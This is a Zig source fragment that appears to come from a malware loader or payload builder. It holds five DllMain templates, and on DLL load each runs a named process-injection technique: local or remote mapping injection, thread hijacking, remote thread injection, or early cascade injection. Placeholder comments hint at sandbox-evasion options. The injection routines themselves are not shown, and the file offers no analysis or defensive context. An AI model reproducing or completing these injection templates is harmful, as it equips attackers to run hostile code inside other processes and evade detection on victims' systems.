// LOCAL MAPPING INJECTION
pub export fn DllMain(hInstance: windows.HINSTANCE, dwReason: DWORD, lpReserved: ?LPVOID) callconv(WINAPI) BOOL {
    _ = hInstance;
    _ = lpReserved;
    switch (dwReason) {
        win32.DLL_PROCESS_ATTACH => {
           // Sandbox protection option enabled?
           // enable runtime protection
            local_map_injection();
        },
        win32.DLL_PROCESS_DETACH => {},
        else => {},
    }
    return windows.TRUE;
}
// END OF LOCAL MAPPING INJECTION



// HIJACK THREAD INJECTION
pub export fn DllMain(hInstance: windows.HINSTANCE, dwReason: DWORD, lpReserved: ?LPVOID) callconv(WINAPI) BOOL {
    _ = hInstance;
    _ = lpReserved;
    switch (dwReason) {
        win32.DLL_PROCESS_ATTACH => {
         // Sandbox protection option enabled?
         // enable runtime protection
            createThreadAndExecute(sampleProcedure);
        },
        win32.DLL_PROCESS_DETACH => {},
        else => {},
    }
    return windows.TRUE;
}
// END OF HIJACK THREAD INJECTION


// HIJACK REMOTE THREAD INJECTION
pub export fn DllMain(hInstance: windows.HINSTANCE, dwReason: DWORD, lpReserved: ?LPVOID) callconv(WINAPI) BOOL {
    _ = hInstance;
    _ = lpReserved;
    switch (dwReason) {
        win32.DLL_PROCESS_ATTACH => {
            // Sandbox protection option enabled?
            // enable runtime protection
            remote_thread_injection();

        },
        win32.DLL_PROCESS_DETACH => {},
        else => {},
    }
    return windows.TRUE;
}
// END OF HIJACK REMOTE THREAD INJECTION


// REMOTE MAPPING INJECTION
pub export fn DllMain(hInstance: windows.HINSTANCE, dwReason: DWORD, lpReserved: ?LPVOID) callconv(WINAPI) BOOL {
    _ = hInstance;
    _ = lpReserved;
    switch (dwReason) {
        win32.DLL_PROCESS_ATTACH => {
            // Sandbox protection option enabled?
            // enable runtime protection
            remote_map_injection();

        },
        win32.DLL_PROCESS_DETACH => {},
        else => {},
    }
    return windows.TRUE;
}
// END OF REMOTE MAPPING INJECTION

// EARLY CASCADE INJECTION
pub export fn DllMain(hInstance: windows.HINSTANCE, dwReason: DWORD, lpReserved: ?LPVOID) callconv(WINAPI) BOOL {
    _ = hInstance;
    _ = lpReserved;
    switch (dwReason) {
        win32.DLL_PROCESS_ATTACH => {
            // Sandbox protection option enabled?
            // enable runtime protection
            run_cascade_injection();
        },
        win32.DLL_PROCESS_DETACH => {},
        else => {},
    }
    return windows.TRUE;
}
// END OF EARLY CASCADE INJECTION





